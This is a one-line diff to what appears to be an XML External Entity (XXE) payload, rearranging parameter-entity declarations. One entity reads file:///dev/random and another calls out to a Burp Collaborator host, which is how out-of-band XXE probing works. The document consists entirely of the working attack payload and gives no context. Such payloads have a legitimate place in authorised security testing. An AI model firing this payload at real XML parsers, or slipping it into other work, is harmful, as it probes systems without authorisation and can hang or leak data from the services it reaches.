@@ -1,1 +1,1 @@
-<!ENTITY % eval SYSTEM "https://fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/">%eval;<!ENTITY % error SYSTEM 'file:///dev/random'>%error;
+<!ENTITY % error SYSTEM 'file:///dev/random'><!ENTITY % eval SYSTEM "https://fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/%error;">%eval;
